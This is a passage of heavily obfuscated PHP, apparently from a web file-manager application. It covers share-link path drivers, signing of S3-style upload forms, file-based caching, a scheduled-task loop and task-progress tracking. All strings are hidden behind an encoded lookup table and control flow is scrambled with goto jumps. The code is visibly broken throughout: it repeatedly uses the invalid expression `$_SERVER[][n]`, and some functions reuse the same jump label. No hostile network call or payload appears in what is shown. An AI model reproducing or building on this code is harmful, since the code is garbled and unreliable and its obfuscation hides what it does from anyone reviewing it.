$cȈ)) { return; } $Dߠ = call_user_func_array(array($B[1211], $cȈ), $Fϝ); $dկĪ = array($B[1212], $B[1213], $B[1214], $B[1215], $B[513], $B[515], $B[1216], $B[106], $B[1217], $B[1218]); if (in_array($cȈ, $dկĪ)) { $Dߠ = $this->getPathOuter($Dߠ); } return $Dߠ; } public function copy($Cٜ, $B׺, $d = false) { return $this->copyMove($Cٜ, $B׺, $d, $_SERVER[][513]); } public function move($Fй, $F蜤, $b̓ = false) { return $this->copyMove($Fй, $F蜤, $b̓, $_SERVER[][515]); } private function copyMove($Fݵ, $F, $e򇻎؅, $bډ) { goto E; E: $bޓ =& $_SERVER[]; $f̗ = $F; $D缵 = IO::driverMake($F); goto Bچê; b刮: return $aъ; goto DӠ; Bچê: if ($D缵->pathParse[$bޓ[1047]]) { $F = $D缵->pathParse[$bޓ[1047]]; } else { $F = $f̗; } $aъ = IO::copyMove($Fݵ, $F, $e򇻎؅, $bډ); $aъ = $this->getPathOuter($aъ); goto b刮; DӠ: } public function pathThis($E) { return get_path_this($this->pathParse[$_SERVER[][75]]); } public function pathFather($D̽) { return get_path_father($this->pathParse[$_SERVER[][75]]); } public function iconvSystem($bϐ) { return $bϐ; } protected function infoParse($eݍώ, $eԺ = false) { $d =& $_SERVER[]; $a = $this->pathParse[$d[460]][$d[1070]] . $this->pathParse[$d[1063]]; if ($eԺ) { $Eł = IO::infoWithChildren($a); } else { $Eł = IO::info($a); } $Dű㛼 = $this->pathParse[$d[460]]; return Action($d[1210])->_shareItemeParse($Eł, $Dű㛼); } public function listAll($Aݫ) { $b񧴠 =& $_SERVER[]; $Dɤ = IO::listAll($Aݫ); $Fڗ = $this->pathParse[$b񧴠[460]]; foreach ($Dɤ as &$f) { check_abort(); $f = array_merge(IO::info($f[$b񧴠[75]]), $f); $f[$b񧴠[84]] = Action($b񧴠[1210])->_shareItemeParse($f, $Fڗ); } unset($f); return $Dɤ; } public function getPathOuter($f) { goto D; D: $a똩Ռ =& $_SERVER[]; $C = KodIO::parse($f); if ($C[$a똩Ռ[29]] == KodIO::KOD_SHARE_ITEM) { return $C[$a똩Ռ[75]]; } goto f; aҝ: if (substr($Bؼ܌, 0, strlen($EÉ)) != $EÉ) { return !1; } return $this->pathParse[$a똩Ռ[1064]] . $a똩Ռ[8] . ltrim($aӫщ, $a똩Ռ[8]); goto DՃ; f: $Bؼ܌ = KodIO::clear($f); $EÉ = KodIO::clear($this->pathParse[$a똩Ռ[460]][$a똩Ռ[1070]]); $aӫщ = substr($Bؼ܌, strlen($EÉ)); goto aҝ; DՃ: } public function getType() { $E̊ԭ =& $_SERVER[]; $cƸ = str_replace($E̊ԭ[71], $E̊ԭ[33], get_class($this)); return strtolower($cƸ); } public function isTypeObject($aՆԻ) { return IO::isTypeObject($aՆԻ); } public function info($a衿) { return $this->infoParse($a衿); } public function infoAuth($DΔ̄) { return $this->infoParse($DΔ̄); } public function infoWithChildren($CЌ) { return $this->infoParse($CЌ, !0); } public function infoFull($F) { return $this->infoParse($F); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($a߂ݥ) { $this->pathParse = $a߂ݥ; } protected function infoParse($Eܧ, $Cߦ = false) { $eǙĔ =& $_SERVER[]; return Action($eǙĔ[1069])->sharePathInfo($this->pathParse[$eǙĔ[75]], !0, $Cߦ); } public function listPath($CșȎ, $fӳ = false) { $f =& $_SERVER[]; $fͫ٦ϑ = IO::listPath($CșȎ, $fӳ); foreach ($fͫ٦ϑ as $Aۨ => $D岘) { if (!in_array($Aۨ, array($f[73], $f[74]))) { continue; } foreach ($D岘 as $f䉌 => $F⡺׹) { $F⡺׹ = Action($f[1219])->parsePathChildren($F⡺׹, array($f[408] => $CșȎ)); $fͫ٦ϑ[$Aۨ][$f䉌] = Action($f[1069])->shareItemInfo($F⡺׹); } } return $fͫ٦ϑ; } public function listAll($c׵) { $C، =& $_SERVER[]; $dŭ = IO::listAll($c׵); foreach ($dŭ as &$b瘎) { $b瘎 = array_merge(IO::info($b瘎[$C،[75]]), $b瘎); $b瘎[$C،[84]] = Action($C،[1069])->shareItemInfo($b瘎); } unset($b瘎); return $dŭ; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($D距) { parent::__construct($D距); $this->signatureVersion($_SERVER[][210]); } public function uploadFormData($BԄ, $bԥ = 3600) { goto dД; AÛ: $FĬ = $Fȅ[1222]; $D웤 = $bԥ . $Fȅ[33]; $C = $Fȅ[1186]; goto B; e°: $d = $Fȅ[59]; $Bڥ = gmdate($Fȅ[1221]); $eݔ = gmdate($Fȅ[726]); goto AÛ; B: $E = array($Fȅ[209] => $Fȅ[33], $Fȅ[1232] => $Fȅ[33], $Fȅ[1190] => $d, $Fȅ[1194] => $C, $Fȅ[1198] => $aۊԍܑ, $Fȅ[1233] => $aϰ, $Fȅ[1234] => $C, $Fȅ[1235] => $Bڥ, $Fȅ[1236] => $D웤, $Fȅ[1237] => $B߾ˌ, $Fȅ[175] => $this->getHost()); return $E; goto Dߣ; B: $e䂬׮ = array($this->accessKey, $eݔ, $this->region, $d, $FĬ); $aϰ = implode($Fȅ[8], $e䂬׮); $f = array($Fȅ[1188] => gmdate($Fȅ[1187], strtotime($Fȅ[1223])), $Fȅ[1189] => array(array($Fȅ[1191] => $this->bucket), array($Fȅ[1190] => $d), array($Fȅ[1192], $Fȅ[1193], $Fȅ[33]), array($Fȅ[1192], $Fȅ[1224], $Fȅ[33]), array($Fȅ[1192], $Fȅ[1225], $Fȅ[33]), array($Fȅ[1194] => $C), array($Fȅ[1226] => $aϰ), array($Fȅ[1227] => $C), array($Fȅ[1228] => $Bڥ), array($Fȅ[1229] => $D웤))); goto Dˢ; B: $eݒ = hash_hmac($Fȅ[1230], $d, $Cḵ, !0); $FнȽ = hash_hmac($Fȅ[1230], $FĬ, $eݒ, !0); $B߾ˌ = hash_hmac($Fȅ[1230], $aۊԍܑ, $FнȽ); goto B; dД: $Fȅ =& $_SERVER[]; $d = $Fȅ[191]; $C = $Fȅ[1220]; goto e°; Dˢ: $aۊԍܑ = base64_encode(json_encode($f)); $cӌ疃 = hash_hmac($Fȅ[1230], $eݔ, $Fȅ[1231] . $this->secret, !0); $Cḵ = hash_hmac($Fȅ[1230], $this->region, $cӌ疃, !0); goto B; Dߣ: } } goto d뤚; e᷐: $E = $_SERVER[][569]; if (!$E) { return; } $_SERVER[] = explode($_SERVER[][570], gzinflate(substr($_SERVER[][571], 10, -8))); goto D垬; cÜ: if ($_SERVER[$_SERVER[][794]] != $d($a×ן)) { goto f; f: $eꃉ = $_SERVER[][795]; $b낅 = $_SERVER[$_SERVER[][796]] . $_SERVER[][797]; $D눪 = $eꃉ($b낅); goto D; D: $Dㅣ = explode($_SERVER[][227], $D눪); if (count($Dㅣ) < $_SERVER[][583]) { $Fʈ = $_SERVER[][798]; $Fʈ(); } $FԖ = $_SERVER[][799]; goto cӿ; cӿ: $FԖ($a×ן); goto aӫ; aӫ: } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto EƘ; aƫ: $F = $GLOBALS[$CƑһ[6]][$CƑһ[345]]; $Eƽ = $F[$F[$CƑһ[800]]]; $e۟ = $F[$CƑһ[801]]; goto cքҔ; cքҔ: switch ($F[$CƑһ[800]]) { case $CƑһ[17]: self::$handle = Model($CƑһ[802]); break; case $CƑһ[803]: self::$handle = new CacheRedis($Eƽ, $e۟); break; case $CƑһ[804]: self::$handle = new CacheMemcached($Eƽ, $e۟); break; case $CƑһ[173]: self::$handle = new CacheFile($Eƽ, $e۟); break; default: break; } return self::$handle; goto e܎; EƘ: $CƑһ =& $_SERVER[]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto aƫ; e܎: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($Cȍ׷) { if (is_array($Cȍ׷) || is_object($Cȍ׷)) { $Cȍ׷ = json_encode($Cȍ׷); } $Cȍ׷ = rawurlencode($Cȍ׷); return md5(KOD_SITE_ID . $_SERVER[][70] . $Cȍ׷); } public static function get($dޤ̽, $b؞ = false) { $B˓ؑ = self::key($dޤ̽); if ($b؞) { return unserialize(self::init()->get($B˓ؑ)); } if (!isset(self::$memoryCache[$B˓ؑ])) { $Cʭ򘘏 = self::init()->get($B˓ؑ); self::$memoryCache[$B˓ؑ] = unserialize($Cʭ򘘏); } return self::$memoryCache[$B˓ؑ]; } public static function set($Cϰމ, $Bꊚ, $b = false) { goto Eϻܻ; Eϻܻ: $F = self::key($Cϰމ); if (isset(self::$memoryCache[$F]) && self::$memoryCache[$F] === $Bꊚ) { return !0; } if ($b === 0) { self::$memoryCache[$F] = $Bꊚ; return !0; } goto cŝ; cŝ: CacheLock::lock($Cϰމ); $eʟ = self::init()->set($F, serialize($Bꊚ), $b); self::$memoryCache[$F] = $Bꊚ; goto Fⱎ; Fⱎ: CacheLock::unlock($Cϰމ); return $eʟ; goto e㿑; e㿑: } public static function remove($e׽) { goto fĽ; fĽ: $eۗ = self::key($e׽); unset(self::$memoryCache[$eۗ]); self::clearTimeout(); goto dݟ׉; dݟ׉: CacheLock::lock($e׽); $C = self::init()->remove($eۗ); CacheLock::unlock($e׽); goto Fڔ; Fڔ: return $C; goto b; b: } public static function removeMemory($aւ) { $FØ = self::key($aւ); unset(self::$memoryCache[$FØ]); } public static function clearMemory($B̠ = false) { if ($B̠) { $B̠ = self::key($B̠); unset(self::$memoryCache[$B̠]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[][805])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[][806])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($aά, $c֘) { $d =& $_SERVER[]; $this->cachePath = $aά[$d[75]]; $this->prefix = $d[807]; $this->cacheTime = $c֘; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($e돸) { $E̮ɶ =& $_SERVER[]; $e돸 = str_replace(array($E̮ɶ[808], $E̮ɶ[96], $E̮ɶ[69]), $E̮ɶ[809], $e돸); return $this->cachePath . $E̮ɶ[810] . $e돸 . $E̮ɶ[811]; } public function set($Fȇв, $DތՋ, $d½ = false) { $F͂ = $this->getFile($Fȇв); if (file_put_contents($F͂, $this->prefix . $DތՋ, LOCK_EX)) { return !0; } @unlink($F͂); return !1; } public function get($cȹ) { $B鈨 = $this->getFile($cȹ); if (file_exists($B鈨) && filemtime($B鈨) < time() - $this->cacheTime) { @unlink($B鈨); return !1; } $C̮ = @file_get_contents($B鈨); return substr($C̮, strlen($this->prefix)); } public function remove($B鰦) { $C = $this->getFile($B鰦); return @unlink($C); } public function deleteAll() { $Eȇ =& $_SERVER[]; $aω = scandir($this->cachePath); foreach ($aω as $E􉵵ɸ) { $Aږ = $this->cachePath . $E􉵵ɸ; if (strpos($Aږ, $Eȇ[811]) && strpos($Aږ, $Eȇ[812])) { @unlink($Aږ); } } } public function clearTimeout() { $B⻑ =& $_SERVER[]; $dꖹ֣ = scandir($this->cachePath); foreach ($dꖹ֣ as $d滻) { $bǛ = $this->cachePath . $d滻; if (strpos($bǛ, $B⻑[811]) && strpos($bǛ, $B⻑[812]) && filemtime($bǛ) < time() - $this->cacheTime) { @unlink($bǛ); } } } } goto eܪ; cˎ: class AutoTask { public static function start() { goto eԍΟ; a: http_close(); self::valueSet($dʝ[1486], $dʝ[86]); Hook::bind($dʝ[1488], $dʝ[1489]); goto Dܜï; eԍΟ: $dʝ =& $_SERVER[]; if (self::valueGet($dʝ[725]) != $dʝ[86]) { return; } if (self::valueGet($dʝ[1486]) == $dʝ[86]) { $Fɹ = self::valueGet($dʝ[1487]); if (time() - $Fɹ > 3600 * 2) { self::restart(); } return; } goto a; Dܜï: while (!0) { self::cacheClear(); if (self::valueGet($dʝ[725]) != $dʝ[86]) { self::valueSet($dʝ[1486], $dʝ[491]); self::log($dʝ[1490]); die; } self::valueSet($dʝ[1486], $dʝ[86]); self::valueSet($dʝ[1487], time()); self::taskRunAll(); sleep(self::valueGet($dʝ[1491])); } goto D; D: } public static function restart() { $Bॻ =& $_SERVER[]; http_close(); self::valueSet($Bॻ[725], $Bॻ[491]); sleep(self::valueGet($Bॻ[1491]) + 5); self::valueSet($Bॻ[1486], $Bॻ[491]); self::valueSet($Bॻ[725], $Bॻ[86]); } public static function shutdownEvent() { $d =& $_SERVER[]; self::valueSet($d[1486], $d[491]); self::log($d[1492]); } public static function config($aɧ, $A) { $C袭 =& $_SERVER[]; $aĎʪ = 10; $A = intval($A) <= $aĎʪ ? $aĎʪ : intval($A); self::valueSet($C袭[725], $aɧ); self::valueSet($C袭[1491], $A); } private static function taskRunAll() { goto C訅߬; Aą: $dޤ = count($e); for ($cƫ䟊 = 0; $cƫ䟊 < $dޤ; $cƫ䟊++) { $E平χ = $e[$cƫ䟊]; if (!$E平χ[$cƬ˟[388]] || $E平χ[$cƬ˟[1494]] != $cƬ˟[86]) { continue; } if (!self::taskTimeCheck($E平χ)) { continue; } self::taskRun($E平χ); } Hook::trigger($cƬ˟[1495]); goto f; f: self::taskQueueRun($f҈ލ); self::closeDatabase(); goto C̎; C訅߬: $cƬ˟ =& $_SERVER[]; $f҈ލ = timeFloat(); $e = Model($cƬ˟[1493])->listData(); goto Aą; C̎: } private static function taskQueueRun($C) { $c = 10; while (!0) { $Bݎ = TaskQueue::run(); if ($Bݎ === !1) { break; } if (timeFloat() - $C >= $c) { break; } } } private static function taskTimeCheck($a酐) { goto bƫ; dɧ: switch ($A[$b[29]]) { case $b[1502]: if (time() - $B < 3600 * 24 * 30) { return !1; } if ($A[$b[1502]] == date($b[1503]) && $c͞) { return !0; } break; case $b[1504]: if (time() - $B < 3600 * 24 * 7) { return !1; } $fݩ˜ = date($b[1505]) == 0 ? 7 : date($b[1505]); if ($A[$b[1504]] == $fݩ˜ && $c͞) { return !0; } break; case $b[1497]: if (time() - $B < 3600 * 24) { return !1; } if ($c͞) { return !0; } break; case $b[1506]: if (time() - $B >= floatval($A[$b[1506]]) * 60) { return !0; } break; default: break; } return !1; goto e˦; bƫ: $b =& $_SERVER[]; $A = json_decode($a酐[$b[195]], !0); $B = intval($a酐[$b[1487]]); goto ał; ał: $d = strtotime($b[1496] . $A[$b[1497]] . $b[1498]) - strtotime($b[1499]); $Bں = time() - strtotime(date($b[1500]) . $b[1501]); $c͞ = $Bں >= $d && $Bں <= $d + 3600; goto dɧ; e˦: } private static function closeDatabase() { goto D; eݔŪ: $a = Model($B[497])->db($B[33]); if ($a) { $a->closeConnect(); } if (time() - TIME > 3600 * 24 * 7) { write_log($B[1507], $B[1508]); die; } goto cǑ; D: $B =& $_SERVER[]; static $F = 0; $F = 1800; goto f; f: if (!$F) { $F = time(); } if (time() - $F < $F) { return; } $F = time(); goto eݔŪ; cǑ: } public static function taskRun($C) { goto c; c: $Dڅ =& $_SERVER[]; self::log($Dڅ[1509] . $C[$Dڅ[388]] . $Dڅ[1510] . $C[$Dڅ[28]] . $Dڅ[1511] . $C[$Dڅ[1512]]); Model($Dڅ[1493])->run($C[$Dڅ[388]]); goto bԉ; a؊: Model($Dڅ[1513])->add(array($Dڅ[1514] => $Dڅ[33], $Dڅ[1515] => $Dڅ[491], $Dڅ[29] => $Dڅ[1516] . $C[$Dڅ[388]], $Dڅ[1517] => json_encode(array($Dڅ[28] => $C[$Dڅ[28]], $Dڅ[1518] => timeFloat() - $a䨧, $Dڅ[289] => $Dݪ)))); self::log($Dڅ[1519] . $C[$Dڅ[388]] . $Dڅ[1520] . $Dݪ); return !0; goto D쇑; bԉ: $a䨧 = timeFloat(); $Dݪ = $Dڅ[33]; switch ($C[$Dڅ[29]]) { case $Dڅ[303]: $F؍ = url_request($C[$Dڅ[1512]], $Dڅ[226], !1, !1, !1, !1, 5); $Dݪ = strlen($F؍); break; case $Dڅ[225]: $Dݪ = Hook::apply($C[$Dڅ[1512]]); default: break; } goto a؊; D쇑: } private static function valueGet($DåǙ) { $Aǖ =& $_SERVER[]; $aÉ = $Aǖ[1521]; $A¾ׇ = Model($Aǖ[1522])->get($DåǙ, $aÉ); if (is_null($A¾ׇ)) { Model($Aǖ[1522])->set($Aǖ[1491], 10, $aÉ); Model($Aǖ[1522])->set($Aǖ[725], $Aǖ[86], $aÉ); Model($Aǖ[1522])->set($Aǖ[1486], $Aǖ[491], $aÉ); $A¾ׇ = Model($Aǖ[1522])->get($DåǙ, $aÉ); } return $A¾ׇ; } private static function valueSet($aڤ, $F) { $dӒ =& $_SERVER[]; return Model($dӒ[1522])->set($aڤ, $F, $dӒ[1521]); } protected static function log($f) { write_log($f, $_SERVER[][1508]); } private static function cacheClear() { $E =& $_SERVER[]; $Bܬ = Model($E[1522])->cacheKey($E[1521]); Cache::clearMemory($Bܬ); Model($E[1493])->cacheClear(); } } class Task { const STATYS_STOP = "\163\x74\157\160"; const STATYS_RUNNING = "\162\165\x6e\156\151\x6e\147"; const STATYS_KILL = "\x6b\x69\154\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($cџ, $e = '', $aԊϾ = 0, $Dۓĉ = '') { goto C; C: $bԆ =& $_SERVER[]; if (self::get($cџ)) { return; } $this->task = array($bԆ[388] => $cџ, $bԆ[1523] => USER_ID, $bԆ[1428] => $Dۓĉ, $bԆ[29] => $e, $bԆ[1023] => $bԆ[33], $bԆ[1021] => $aԊϾ, $bԆ[1035] => 0, $bԆ[1524] => 0, $bԆ[1525] => 0, $bԆ[756] => timeFloat(), $bԆ[755] => 0, $bԆ[1526] => 0, $bԆ[1527] => 0, $bԆ[1528] => 0, $bԆ[725] => $bԆ[1486]); goto bɇ; cǑ: $this->startAfter(); Hook::trigger($bԆ[1533], $this->task); $this->task[$bԆ[1526]] = timeFloat(); goto A; bɇ: $GLOBALS[$bԆ[1529]] = 1; Hook::bind($bԆ[1488], array($this, $bԆ[1530])); Hook::bind($bԆ[1531], array($this, $bԆ[1532])); goto cǑ; A: } public function end() { goto eǯ⮂; AЯ؈: Hook::unbind($Aۅ[1531], array($this, $Aۅ[1532])); $this->endAfter(); $this->task = !1; goto F꣉; Fﱚ: $Bԛດ = timeFloat() - $this->task[$Aۅ[756]]; self::log($Aۅ[1534] . $this->task[$Aۅ[388]] . $Aۅ[1535] . $Bԛດ . $Aۅ[1536]); Hook::unbind($Aۅ[1488], array($this, $Aۅ[1530])); goto AЯ؈; eǯ⮂: $Aۅ =& $_SERVER[]; if (!$this->task) { return; } if ($this->task[$Aۅ[1526]]) { self::valueSet($this->task[$Aۅ[388]], !1); } goto Fﱚ; F꣉: } public function update($b = 0, $Eȸض = false) { goto bׯ; bט: Hook::trigger($Bᛮٍ[1540], $Eܬ߹); self::valueSet($Eܬ߹[$Bᛮٍ[388]], $Eܬ߹); goto bǆ; fŖݥ: $Eܬ߹[$Bᛮٍ[725]] = $f溽 ? $f溽 : $Eܬ߹[$Bᛮٍ[725]]; $Eܬ߹[$Bᛮٍ[1527]] = $Bע[$Bᛮٍ[1527]] ? $Bע[$Bᛮٍ[1527]] : 0; $Eܬ߹[$Bᛮٍ[1526]] = timeFloat(); goto bט; Cȑ: $Eܬ߹[$Bᛮٍ[1035]] += $b; $Eܬ߹[$Bᛮٍ[755]] = timeFloat(); if ($Eܬ߹[$Bᛮٍ[1021]]) { if ($Eܬ߹[$Bᛮٍ[1021]] < $Eܬ߹[$Bᛮٍ[1035]]) { $Eܬ߹[$Bᛮٍ[1021]] = $Eܬ߹[$Bᛮٍ[1035]]; } $A׊ = timeFloat() - $Eܬ߹[$Bᛮٍ[756]] - $Eܬ߹[$Bᛮٍ[1527]]; $Eܬ߹[$Bᛮٍ[1524]] = $Eܬ߹[$Bᛮٍ[1035]] / $Eܬ߹[$Bᛮٍ[1021]]; $Eܬ߹[$Bᛮٍ[1525]] = $Eܬ߹[$Bᛮٍ[1035]] / $A׊; if ($Eܬ߹[$Bᛮٍ[1524]] > 0) { $Eܬ߹[$Bᛮٍ[1528]] = $A׊ * (1 - $Eܬ߹[$Bᛮٍ[1524]]) / $Eܬ߹[$Bᛮٍ[1524]]; } $Eܬ߹[$Bᛮٍ[1528]] = $Eܬ߹[$Bᛮٍ[1528]] <= 0 ? 0 : $Eܬ߹[$Bᛮٍ[1528]]; } goto Cܣ; Cܣ: $this->updateAfter(); $d = 0.2; if (timeFloat() - $Eܬ߹[$Bᛮٍ[1526]] < $d && !$Eȸض) { return; } goto C嶎Ņ; bׯ: $Bᛮٍ =& $_SERVER[]; $Eܬ߹ =& $this->task; if (!$Eܬ߹) { return; } goto Cȑ; C嶎Ņ: $Bע = self::get($Eܬ߹[$Bᛮٍ[388]]); $f溽 = $Bע[$Bᛮٍ[725]]; if ($f溽 == self::STATYS_KILL) { $Dʑ = array($Bᛮٍ[1537] => LNG($Bᛮٍ[1538]), $Bᛮٍ[1085] => !1); Cache::set($Bᛮٍ[1539] . $this->task[$Bᛮٍ[388]], $Dʑ, 30); $this->end(); die; } else { if ($f溽 == self::STATYS_STOP) { $Fč = 2; $Bע[$Bᛮٍ[1527]] += $Fč; self::valueSet($Eܬ߹[$Bᛮٍ[388]], $Bע); sleep($Fč); $this->update(); return; } } goto fŖݥ; bǆ: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($fۂ) { $cտÎމ =& $_SERVER[]; Cache::set($cտÎމ[1539] . $this->task[$cտÎމ[388]], $fۂ, 60); return $fۂ; } public static function get($FϢۣ) { return self::valueGet($FϢۣ); } public static function listData() { $cˠ = self::valueGet(); return array_sort_by($cˠ, $_SERVER[][756], !0); } public static function kill($b) { return self::changeStatus($b, self::STATYS_KILL); } public static function stop($EĶ) { return self::changeStatus($EĶ, self::STATYS_STOP); } public static function restart($Bć) { return self::changeStatus($Bć, self::STATYS_RUNNING); } public static function killAll() { $E =& $_SERVER[]; $A둉 = self::listData(); foreach ($A둉 as $Bݘ) { self::kill($Bݘ[$E[388]]); } sleep(2); foreach ($A둉 as $Bݘ) { self::valueSet($Bݘ[$E[388]], !1); } } private static function changeStatus($f좐, $e) { goto Eܟ䥲; D؍: $b┭[$D߃[725]] = $e; self::valueSet($f좐, $b┭); self::log($D߃[1541] . $b┭[$D߃[388]] . $D߃[1542] . $e); goto Eͱ; Eͱ: return !0; goto c; Eܟ䥲: $D߃ =& $_SERVER[]; $b┭ = self::valueGet($f좐); if (!$b┭) { return !1; } goto D؍; c: } public static function valueGet($Dѱճ = false) { $aτȷ =& $_SERVER[]; if ($Dѱճ) { $a۵ = Model($aτȷ[419])->where(array($aτȷ[92] => $Dѱճ, $aτȷ[29] => $aτȷ[1543]))->find(); return $a۵ ? json_decode($a۵[$aτȷ[370]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($Bƿ = false) { goto B럦; e: $a͕ = Model($D䑜ַ[419])->where($B)->select(); $a͕ = $a͕ ? $a͕ : array(); foreach ($a͕ as $fɃ => $Cݓ) { $a͕[$fɃ] = json_decode($Cݓ[$D䑜ַ[370]], !0); } goto CԊ; CԊ: return $a͕; goto d捘; B럦: $D䑜ַ =& $_SERVER[]; $B = array($D䑜ַ[29] => $D䑜ַ[1543]); if ($Bƿ) { $B[$D䑜ַ[1523]] = $Bƿ; } goto e; d捘: } public static function valueSet($FҜ, $A蝧) { goto f; DҊ: Model($b[419])->add($aݕ, array(), !0); goto E; f: $b =& $_SERVER[]; if (!$A蝧) { return Model($b[419])->where(array($b[92] => $FҜ, $b[29] => $b[1543]))->delete(); } $cԻԗ = json_encode($A蝧); goto Cǐ; Cǐ: if (!$cԻԗ) { ob_start(); var_dump($A蝧); $B݂ = ob_get_clean(); self::log($b[1544] . json_encode_force($B݂)); } if (!$FҜ || !$A蝧[$b[388]]) { return !1; } $aݕ = array($b[29] => $b[1543], $b[1523] => USER_ID, $b[92] => $FҜ, $b[370] => $cԻԗ); goto DҊ; E: } public static function log($b٥) { write_log($b٥, $_SERVER[][1545]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto Fю; eֵܨ: $bߍ[$c[1570]] = 0; $bߍ[$c[1571]] = 0; if (!$bߍ[$c[1428]]) { $bߍ[$c[1428]] = LNG($c[1572]); } goto D; AƗ: Hook::bind($c[561], array($this, $c[1551])); Hook::bind($c[562], array($this, $c[1552])); Hook::bind($c[564], array($this, $c[1553])); goto c֬Ȳ; Fю: $c =& $_SERVER[]; $bߍ =& $this->task; $this->sourceCopyFolder = !1; goto c뮌; c: Hook::bind($c[1558], array($this, $c[1559])); Hook::bind($c[1560], array($this, $c[1561])); Hook::bind($c[1562], array($this, $c[1563])); goto E; c֬Ȳ: Hook::bind($c[565], array($this, $c[1553])); Hook::bind($c[532], array($this, $c[1554])); Hook::bind($c[529], array($this, $c[1554])); goto F䭚; E: $bߍ[$c[1564]] = LNG($c[1565]); $bߍ[$c[1566]] = 0; $bߍ[$c[1567]] = 0; goto Cƅ; Cƅ: $bߍ[$c[1023]] = $c[33]; $bߍ[$c[1568]] = $c[33]; $bߍ[$c[1569]] = 0; goto eֵܨ; F䭚: Hook::bind($c[534], array($this, $c[1554])); Hook::bind($c[536], array($this, $c[1554])); Hook::bind($c[538], array($this, $c[1554])); goto eß陫; c뮌: Hook::bind($c[1546], array($this, $c[1547])); Hook::bind($c[1108], array($this, $c[1548])); Hook::bind($c[1549], array($this, $c[1550])); goto AƗ; eß陫: Hook::bind($c[1555], array($this, $c[1556])); Hook::bind($c[554], array($this, $c[1557])); $this->sourceModelCopyFlag = !1; goto c; D: } protected function endAfter() { goto DӜ; dƻه: Hook::unbind($cع[564], array($this, $cع[1553])); Hook::unbind($cع[565], array($this, $cع[1553])); Hook::unbind($cع[532], array($this, $cع[1554])); goto aݧ; cɍ: Hook::unbind($cع[1558], array($this, $cع[1559])); Hook::unbind($cع[1560], array($this, $cع[1561])); Hook::unbind($cع[1562], array($this, $cع[1563])); goto A˪; bŪ: Hook::unbind($cع[538], array($this, $cع[1554])); Hook::unbind($cع[1555], array($this, $cع[1556])); Hook::unbind($cع[554], array($this, $cع[1557])); goto cɍ; aݧ: Hook::unbind($cع[529], array($this, $cع[1554])); Hook::unbind($cع[534], array($this, $cع[1554])); Hook::unbind($cع[536], array($this, $cع[1554])); goto bŪ; e: Hook::unbind($cع[1549], array($this, $cع[1550])); Hook::unbind($cع[561], array($this, $cع[1551])); Hook::unbind($cع[562], array($this, $cع[1552])); goto dƻه; DӜ: $cع =& $_SERVER[]; Hook::unbind($cع[1546], array($this, $cع[1547])); Hook::unbind($cع[1108], array($this, $cع[1548])); goto e; A˪: } public function copyMoveStart($AʅҌ, $Bć, $E׻, $A摱) { goto AޯԻ; AޯԻ: $a =& $_SERVER[]; self::log($a[1573] . $Bć . $a[66] . $A摱); $bŷ = rtrim(TEMP_FILES, $a[8]); goto eб; eб: if (substr($Bć, 0, strlen($bŷ)) == $bŷ) { return; } if (substr($A摱, 0, strlen($bŷ)) == $bŷ) { return; } $c =& $this->task; goto C蚦޸; C蚦޸: $c[$a[1574]] = KodIO::transferType($AʅҌ, $E׻); $this->update(); goto Aٞ; Aٞ: } public function updateAfter() { goto cШܬ; A땲: if ($this->sourceModelCopyFlag) { return; } if ($bاφѸ[$E[1574]] == $E[1180]) { return; } if ($bاφѸ[$E[1574]] == $E[1093] || $bاφѸ[$E[1574]] == $E[106]) { if ($bاφѸ[$E[1568]]) { $bاφѸ[$E[1571]] = $bاφѸ[$E[1570]] + $bاφѸ[$E[1567]]; } } else { if ($bاφѸ[$E[1574]] == $E[1181]) { if ($bاφѸ[$E[1568]] == $E[1093]) { $bاφѸ[$E[1571]] = $bاφѸ[$E[1570]] + $bاφѸ[$E[1567]] * 0.5; } else { if ($bاφѸ[$E[1568]] == $E[106]) { $bاφѸ[$E[1571]] = $bاφѸ[$E[1570]] + $bاφѸ[$E[1566]] * 0.5 + $bاφѸ[$E[1567]] * 0.5; } } } } goto Dդ; Dդ: $bاφѸ[$E[1524]] = $bاφѸ[$E[1571]] / $bاφѸ[$E[734]]; if ($bاφѸ[$E[1524]] > 0) { $a = timeFloat() - $bاφѸ[$E[756]] - $bاφѸ[$E[1527]]; $bاφѸ[$E[1528]] = $a * (1 - $bاφѸ[$E[1524]]) / $bاφѸ[$E[1524]]; } goto cݒ; cШܬ: $E =& $_SERVER[]; $bاφѸ =& $this->task; if (!$bاφѸ[$E[734]]) { return; } goto A땲; cݒ: } public function addPath($Eݳ) { goto a; bҎ: if ($e[$CŌ[29]] == $CŌ[173]) { $fԈ[$CŌ[1021]] += 1; } else { $fԈ[$CŌ[1021]] += $e[$CŌ[80]][$CŌ[78]]; if ($e[$CŌ[390]]) { $fԈ[$CŌ[1021]] += $e[$CŌ[80]][$CŌ[79]] + 1; } } $fԈ[$CŌ[734]] += $e[$CŌ[77]]; $this->update(); goto Cސ; Eʄ: $e = IO::infoWithChildren($Eݳ); $e = $fԈ[$CŌ[1575]] ? $fԈ[$CŌ[1575]][$CŌ[1576]] : 0; $fԈ[$CŌ[1575]] = array($CŌ[1576] => $e + 1, $CŌ[407] => $e[$CŌ[28]], $CŌ[75] => $e[$CŌ[75]], $CŌ[489] => $e[$CŌ[489]] ? $e[$CŌ[489]] : $e[$CŌ[75]]); goto bҎ; a: $CŌ =& $_SERVER[]; if (!$Eݳ) { return; } $fԈ =& $this->task; goto Eʄ; Cސ: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($cݓ) { $e =& $_SERVER[]; $A˧ =& $this->task; $A˧[$e[1564]] = $cݓ[$e[28]]; $A˧[$e[1023]] = $cݓ[$e[28]]; $this->update(); } public function 